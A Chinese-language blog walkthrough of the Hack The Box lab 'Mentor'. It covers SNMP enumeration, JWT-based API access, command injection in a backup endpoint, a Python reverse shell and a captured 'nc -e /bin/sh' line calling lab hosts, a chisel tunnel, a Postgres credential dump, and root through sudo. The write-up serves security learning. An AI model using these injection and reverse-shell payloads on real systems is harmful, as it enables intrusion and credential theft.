---
title: 'HTB:Mentor'
date: 2023-03-15 22:11:44
tags: [刷题,HTB,学习笔记]
published: true
hideInList: false
feature: 
isTop: false
---
# HTB：Mentor

## RECON

是Flask（ `2.0.3`) 的网站，**TCP**端口扫描结果就是： `20`, `53` , `80` ，然后试着目录遍历（不过我第一次使用的字典暂时没有什么有价值的收获）和子域名，在这个同时我会去翻看网页源代码和其他信息

在搜查的过程中，发现了使用到了 `Werkzeug` ，关于它的介绍如下：

> 
> 
> 
> 在Python Web开发中，Werkzeug通常与其他框架（如Flask、Django等）一起使用，作为这些框架的底层库。使用Werkzeug，开发人员可以更轻松地处理HTTP请求和响应，实现中间件（middleware）和拦截器（interceptor）等功能，以及进行调试和测试。
> 
> 总之，如果你在Python Web开发中需要处理HTTP请求和响应、实现中间件或进行调试和测试等任务，那么Werkzeug可能会是一个有用的技术栈
> 

在著名的[hackertricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)下去查看一些针对 `Werkzeug` 的攻击手段，这里发现原始网页对 `/consoel` 是禁止访问的，所以需要去想办法查看PIN number

原理讲解：[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) 

PIN的生成主要在以下的两个list变量中

```python
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
# getattr(app, '__name__', getattr (app .__ class__, '__name__')) is Flask 
# getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory
# uuid.getnode() is the MAC address of the current computer, str (uuid.getnode ()) is the decimal expression of the mac address
# get_machine_id() read the value in /etc/machine-id or /proc/sys/kernel/random/boot_i and return directly if there is
```

其中 mac地址在 `/proc/net/arp` （指的是Linux）

然后挖掘了一下，发现不是这里的问题 🥲  我发现我老是把简单的问题想复杂……啊啊啊啊啊啊（菜狗痛苦.jpg)。然后直线距离会绕个弯走。但是等待扫描结果的过程真的好痛苦（菜狗痛苦×2.jpg)……

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/20230315.png)

反复测试，最后子域名发现了（竟然是404）

- api.mentorquotes.htb

同理，加入到 `/etc/hosts` 里。

## 子域名扫描

虽然我每个工具的命令都是单独总结的，但是偶尔贴一下吧

```python
wfuzz -c -w <dict> -u "http://api.mentorquotes.htb/FUZZ" --hc 404
```

结果

```python
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                       
=====================================================================
000000004:   307        0 L      0 W        0 Ch        "admin"                                                                                                                                                                                       
000000124:   200        30 L     62 W       969 Ch      "docs"                                                                                                                                                                                        
000000205:   307        0 L      0 W        0 Ch        "users"
000001440:   307        0 L      0 W        0 Ch        "quotes"
000004658:   403        9 L      28 W       285 Ch      "server-status"

```

## /docs 探索

### Auth

以前也刷过关于api的box：[https://1dayluo.github.io/post/htbbackend-api/](https://1dayluo.github.io/post/htbbackend-api/)   （这个还真的不错，当时刷过一次就觉得学到了很多）

注册

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303151.png)

登录

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303152.png)

返回的内容是：

```python
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0
```

### Users

直接用docs下的发起是失败的

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303153.png)

然后我注意到了

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303154.png)

把刚刚login的内容作为jwt传入到header里

```lua
GET /users/ HTTP/1.1
Host: api.mentorquotes.htb
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
DNT: 1
Referer: http://api.mentorquotes.htb/docs
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-gpc: 1
Connection: close
```

返回：

```lua
{"detail":"Only admin users can access this resource"}
```

包括 `/users/{id}` 也是一样，虽然有跳转，但是最终还是提示只有管理员用户可以使用。看起来应该用了规则匹配，后面的 `/users/add` 应该也是同理

### Quotes

也是一样的道理。

1. quotes - GET

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303155.png)

1. quotes - POST ： 提示只有管理员才可以
2. quotes - PUT ： 提示只有管理员才可以
3. quotes - POST ： 提示只有管理员才可以
4. quotes - DELETE ： 提示只有管理员才可以

## SNMP - private

api探索了好一阵，看哪里能获取管理员auth，但是无果。然后又回归到了大佬0xdf的博客（谢谢大佬TUT）

我忽视了UDP port……

```bash
sudo nmap -p- -sU --min-rate 10000 -oA /tmp/nmap-udp 10.10.11.193

# 扫描结果：
# PORT    STATE SERVICE
# 161/udp open  snmp
```

问chatGPT和newBing关于SNMP是干嘛的回答

> chatGPT:
一个网站可能需要使用SNMP来监控网络设备的状态和性能，以确保网络设备正常运行。例如，如果网站依赖于负载均衡器、路由器、交换机等网络设备，监控这些设备的状态和性能可以帮助管理员及时发现和解决网络问题，提高网络的可用性和可靠性。此外，SNMP还可以用于收集网站服务器的性能指标，如CPU利用率、内存使用率、磁盘空间等，以帮助管理员优化网站性能和资源利用率。

Bing:
> 
> 
> 您好，这是Bing。😊
> 
> SNMP（简单网络管理协议）是一种网络协议，用于管理和监视IP网络中的网络设备，如服务器，工作站，路由器，交换机等[1](https://www.pconline.com.cn/win11/1511/15111684.html)。一个网站可能需要用到SNMP的情况有：
> 
> - 网站的管理员需要监控和配置网站的服务器或其他设备[2](https://resources.infosecinstitute.com/topic/snmp-pentesting/)。
> - 网站的安全测试人员需要检测网站是否存在SNMP相关的漏洞[3](https://blog.domotz.com/know-your-networks/snmp-port-number/) [4](https://resources.infosecinstitute.com/topic/vulnerability-assessment-of-snmp-service-ii/)。
> - 网站的用户需要通过SNMP获取网站的性能或状态信息。
> 
> 您想了解更多关于SNMP的什么内容呢？
> 

恩……这波是bing赢了

snmp除了用nmap外，还有以下工具：

- https://github.com/SECFORCE/SNMP-Brute.git
- https://github.com/trailofbits/onesixtyone

我用了snmp-brute。首先要根据README下载一些基础依赖。然后按照官方/help来的运行就好，

工具捕获到的数据 （发现管理员邮箱）

```bash
################## Enumerating SYSTEM Table using: iso.3.6.1.2.1.1  (SYSTEM Info)
	INFO
	----	
	STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
	OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
	Timeticks: (6160235) 17:06:42.35
	STRING: Me <admin@mentorquotes.htb>
	STRING: mentor
	STRING: Sitting on the Dock of the Bay
	INTEGER: 72

################## Enumerating Interfaces Table using: -Ci (Interface Info)
	Name   Mtu Network Address Ipkts Ierrs Opkts Oerrs Queue

################## Enumerating Routing Table using: -Cr (Route Info)

################## Enumerating Netstat Table using:  (Netstat)
	Active Internet (udp) Connections
	Proto Local Address               Remote Address                PID
	udp4  *.*                         *.*                             0
```

这里不太会，就跟着佬们的writeup来学习了，

然后我用了 `snmpbulkwalk` 工具

```bash
HOST-RESOURCES-MIB::hrSWRunPath.921 = STRING: "/usr/libexec/udisks2/udisksd"
HOST-RESOURCES-MIB::hrSWRunPath.927 = STRING: "/usr/sbin/ModemManager"
HOST-RESOURCES-MIB::hrSWRunPath.1200 = STRING: "/usr/sbin/cron"
HOST-RESOURCES-MIB::hrSWRunPath.1208 = STRING: "/usr/sbin/snmpd"
HOST-RESOURCES-MIB::hrSWRunPath.1221 = STRING: "/usr/bin/containerd"
HOST-RESOURCES-MIB::hrSWRunPath.1242 = STRING: "/sbin/agetty"
HOST-RESOURCES-MIB::hrSWRunPath.1243 = STRING: "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
HOST-RESOURCES-MIB::hrSWRunPath.1254 = STRING: "/usr/sbin/apache2"
HOST-RESOURCES-MIB::hrSWRunPath.1340 = STRING: "/usr/bin/dockerd"
HOST-RESOURCES-MIB::hrSWRunPath.1691 = STRING: "/bin/bash"
HOST-RESOURCES-MIB::hrSWRunPath.1742 = STRING: "/usr/bin/docker-proxy"
HOST-RESOURCES-MIB::hrSWRunPath.1755 = STRING: "/usr/bin/containerd-shim-runc-v2"
HOST-RESOURCES-MIB::hrSWRunPath.1781 = STRING: "postgres"
HOST-RESOURCES-MIB::hrSWRunPath.1838 = STRING: "postgres: checkpointer "
HOST-RESOURCES-MIB::hrSWRunPath.1839 = STRING: "postgres: background writer "
HOST-RESOURCES-MIB::hrSWRunPath.1840 = STRING: "postgres: walwriter "
HOST-RESOURCES-MIB::hrSWRunPath.1841 = STRING: "postgres: autovacuum launcher "
HOST-RESOURCES-MIB::hrSWRunPath.1842 = STRING: "postgres: stats collector "
HOST-RESOURCES-MIB::hrSWRunPath.1843 = STRING: "postgres: logical replication launcher "
HOST-RESOURCES-MIB::hrSWRunPath.1849 = STRING: "/usr/bin/docker-proxy"
HOST-RESOURCES-MIB::hrSWRunPath.1863 = STRING: "/usr/bin/containerd-shim-runc-v2"
HOST-RESOURCES-MIB::hrSWRunPath.1889 = STRING: "python3"
HOST-RESOURCES-MIB::hrSWRunPath.1958 = STRING: "/usr/bin/docker-proxy"
HOST-RESOURCES-MIB::hrSWRunPath.1971 = STRING: "/usr/bin/containerd-shim-runc-v2"
HOST-RESOURCES-MIB::hrSWRunPath.1993 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunPath.2007 = STRING: "/usr/local/bin/python3"
HOST-RESOURCES-MIB::hrSWRunPath.2008 = STRING: "/usr/local/bin/python3"
HOST-RESOURCES-MIB::hrSWRunPath.2092 = STRING: "postgres: postgres mentorquotes_db 172.22.0.1(46844) idle"
HOST-RESOURCES-MIB::hrSWRunPath.2110 = STRING: "/usr/bin/python3"
HOST-RESOURCES-MIB::hrSWRunPath.26610 = ""
HOST-RESOURCES-MIB::hrSWRunPath.26614 = STRING: "postgres: postgres mentorquotes_db 172.22.0.1(60892) idle"
HOST-RESOURCES-MIB::hrSWRunPath.91129 = ""
HOST-RESOURCES-MIB::hrSWRunPath.91137 = ""
HOST-RESOURCES-MIB::hrSWRunPath.91143 = STRING: "sh"
HOST-RESOURCES-MIB::hrSWRunPath.91144 = STRING: "/bin/sh"
HOST-RESOURCES-MIB::hrSWRunPath.91148 = STRING: "python3"
HOST-RESOURCES-MIB::hrSWRunPath.91149 = STRING: "/bin/sh"
HOST-RESOURCES-MIB::hrSWRunPath.91419 = STRING: "/usr/libexec/upowerd"
HOST-RESOURCES-MIB::hrSWRunPath.91862 = ""
HOST-RESOURCES-MIB::hrSWRunPath.91958 = STRING: "/usr/sbin/apache2"
HOST-RESOURCES-MIB::hrSWRunPath.91959 = STRING: "/usr/sbin/apache2"
HOST-RESOURCES-MIB::hrSWRunParameters.556 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.557 = STRING: "-d -s"
HOST-RESOURCES-MIB::hrSWRunParameters.561 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.581 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.684 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.685 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.715 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.717 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.737 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.738 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.758 = STRING: "-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
HOST-RESOURCES-MIB::hrSWRunParameters.907 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
HOST-RESOURCES-MIB::hrSWRunParameters.912 = STRING: "--foreground"
HOST-RESOURCES-MIB::hrSWRunParameters.913 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
HOST-RESOURCES-MIB::hrSWRunParameters.914 = STRING: "--no-debug"
HOST-RESOURCES-MIB::hrSWRunParameters.915 = STRING: "-n -iNONE"
HOST-RESOURCES-MIB::hrSWRunParameters.927 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1200 = STRING: "-f -P"
HOST-RESOURCES-MIB::hrSWRunParameters.1208 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f"
HOST-RESOURCES-MIB::hrSWRunParameters.1221 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1242 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.1243 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1254 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1340 = STRING: "-H fd:// --containerd=/run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1691 = STRING: "/usr/local/bin/login.sh"
HOST-RESOURCES-MIB::hrSWRunParameters.1742 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432"
HOST-RESOURCES-MIB::hrSWRunParameters.1755 = STRING: "-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1781 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1838 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1839 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1840 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1841 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1842 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1843 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1849 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1863 = STRING: "-namespace moby -id 556e8c834293dd86447407ed131913827ab286e6c16eb2629ef5567c3beec9ba -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1889 = STRING: "-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1958 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80"
HOST-RESOURCES-MIB::hrSWRunParameters.1971 = STRING: "-namespace moby -id 9fe6db6386def9ee85a401e564be071bc55984fa0962d8748de5e8d6b1076a30 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1993 = STRING: "main.py"
HOST-RESOURCES-MIB::hrSWRunParameters.2007 = STRING: "-c from multiprocessing.semaphore_tracker import main;main(4)"
HOST-RESOURCES-MIB::hrSWRunParameters.2008 = STRING: "-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork"
HOST-RESOURCES-MIB::hrSWRunParameters.2092 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.2110 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
HOST-RESOURCES-MIB::hrSWRunParameters.26610 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.26614 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.91129 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.91137 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.91143 = STRING: "-c tar -c -f $(nc 10.10.14.89 9001 -e /bin/sh)/app_backkup.tar /app/ &"
HOST-RESOURCES-MIB::hrSWRunParameters.91144 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.91148 = STRING: "-c import pty;pty.spawn(\"/bin/sh\")"
HOST-RESOURCES-MIB::hrSWRunParameters.91149 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.91419 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.91862 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.91958 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.91959 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.92142 = ""
```

其中，这里有一个地方有些意思

`: "/usr/local/bin/login.py kj23sadkj123as0-d213"` 

### Login as james

这里本来试着用 `admin@mentorquotes.htb` 结果发现不行，看了提示才知道是docs最上面还泄漏了james的邮箱（ `james@mentorquotes.htb` )

使用james身份登录

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303156.png)

然后将刚刚docs下的api接口的Authorization都替换为james的，users有返回：

```
{"id":1,"email":"james@mentorquotes.htb","username":"james"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"}

```

还有就是能用 `/quotes` 接口，往里新增之类的

另外 `/admin`  也可以用啦

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303157.png)

## SNMP - public

刚刚的命令是获取snmp下 `private` 的部分，还有 `public` 的部分尝试获取：

```bash
~ snmpbulkwalk -v2c -c public 10.10.11.193                                                                                                                                       0 [11:48:10]
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6269914) 17:24:59.14
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (6) 0:00:00.06
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.

HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6273398) 17:25:33.98
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2023-3-15,3:56:37.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 235
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

## /admin

可以看到，现在用james的身份，/admin 返回

```
{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}}
```

测试 /admin/check， 返回： {"details":"Not implemented yet!"} 

然后测试 /admin/backup，根据response一点点构造

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303158.png)

### command injection

从API生成backup，考虑到有可能将传入的path作为command的参数，然后执行命令

测试如下命令：

```
{
		"path": "test; wget  http://10.10.14.32 ;"
}
```

本地收到

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303159.png)

## User flag

参考：[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 下的reverse shell cheat sheet

用bash没有成功，用python的（因为网站基于python的web框架）

```
{
		"path": "test;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.32\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' "
}
```

然后是upgrade shell  `^Z`  后，输入

```
stty raw -echo; fg
```

到用户 $HOME目录下，获取user.flag

## root flag

在 `/app` 目录下查看Dockerfile，当前网站是在容器内运行。

Dockerfile的内容如下：

```docker
FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]
```

在 `/app/app` 下，有有关这个网站的全部py代码，config.py是空，但是db.py有（地址是docker的地址）

```docker
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

想到之前在推看到的文章： [https://dmesg.app/ufw-vs-docker.html](https://dmesg.app/ufw-vs-docker.html) 

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031510.png)

我对这块不太熟悉，所以还是看了大佬的writeup的思路过程。

用https://github.com/jpillora/chisel 的开源

攻击机：

```docker
./chisel_1.8.1_linux_amd64 server -p 8000 --reverse
```

container：

用 Chisel 工具建立一个反向隧道（8000端口），将本地客户端的 5432 端口映射到远程服务器 172.22.0.1 的 5432 端口。

```docker
./chisel_1.8.1_linux_amd64 client 10.10.14.32:8000 R:5432:172.22.0.1:5432
```

### connect to database

命令

```docker
psql -h 127.0.0.1 -p 5432 -U postgres
```

密码也是postgres。输入 `\list` 查看全部database，发现 mentorquotes_db 

1. `\connect mentorquotes_db`  连接到数据库
2. `\dt`

```docker
mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres 
```

1. `select * from xxx` 

```docker
mentorquotes_db=# select * from users;
id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
```

还有一种方法是直接该models，加个password的字段。这样访问api的/users会返回密码

密码是 ： svc@mentorquotes.htb  /  `123meunomeeivani` 

### 提权

查看 `/etc/snmp` 目录，用以下命令去查看相关的snmp配置（去除掉注释）

```docker
/etc/snmp$ cat snmpd.conf | grep -v "^#" | grep .
```

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031511.png)

密码是： `SuperSecurePassword123__` 

登录后 `sudo -l` 查看权限

```docker
sudo /bin/sh
```

## Reference

- [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
- [https://www.daehee.com/werkzeug-console-pin-exploit/](https://www.daehee.com/werkzeug-console-pin-exploit/)
- [https://0xdf.gitlab.io/2023/03/11/htb-mentor.html](https://0xdf.gitlab.io/2023/03/11/htb-mentor.html)
<!-- more -->
